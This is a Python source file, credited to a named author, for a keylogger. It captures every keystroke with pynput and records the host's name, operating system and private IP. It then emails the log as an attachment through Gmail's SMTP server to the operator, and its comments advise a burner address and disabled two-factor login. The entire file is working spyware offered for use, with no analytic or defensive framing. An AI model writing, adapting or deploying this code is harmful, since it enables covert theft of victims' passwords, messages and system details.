#  Basic keylogger with email functionality
#  Justin Moonjeli 2021

from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform

#  Global vars
count = 0  # controls the rate at which the log file is updated
keys = []  # array which holds the keystrokes
filename = "log.txt"  # where the logs are kept
filepath = "<location of the log file>"  # the location of the log file
email_address = "<your email>"  # where the logs are sent, use a burner
password = "<email password>"  # for the email_address, disable 2FA and secure sources
extend = "\\"  # utility


def sys_info():  # Records the basic information of the host system
    with open(filepath + extend + filename, "a") as f:
        hostname = socket.gethostname()
        IP_address = socket.gethostbyname(hostname)
        operating_system = platform.system() + " " + platform.version()
        architecture = platform.machine()

        f.write(f"Host System Name: {hostname}" + "\n")
        f.write(f"Host OS: {operating_system}" + "\n")
        f.write(f"Host System Architecture: {architecture}" + "\n")
        f.write(f"Host Private IP: {IP_address}" + "\n")
        f.write("\n")


sys_info()


def press(key):  # appends keystrokes to array
    global keys, count
    keys.append(key)
    count += 1
    if count >= 30:  # updates the log file at a set rate
        count = 0
        write_log(keys)
        keys = []  # clears the array after each write


def write_log(keys):
    with open(filepath+extend+filename, "a") as f:  # opens the log file
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:  # goes to next line each word
                f.write("\n")
            elif k.find("key") == -1:
                f.write(k)


def release(key):
    if key == Key.esc:  # exit the listener when esc is pressed
        return False


with Listener(on_press = press, on_release = release) as listener:
    listener.join()


def send_email(email_address, attachment, filename):
    msg = MIMEMultipart()  # start instance of MIMEMultipart 
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = "Keylog Update"
    body = "see attached"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, "rb")

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())  # encode the payload
    encoders.encode_base64(p)  # encode into base64

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    
    s = smtplib.SMTP('smtp.gmail.com', 587)  # creates an SMTP session
    s.starttls()  # security
    s.login(email_address, password)
    text = msg.as_string()  # converts message into a string
    s.sendmail(email_address, email_address, text)  # sends the mail
    s.quit()  # ends the session


send_email(email_address, filepath+extend+filename, filename)  # sends the email once the listener has been ended
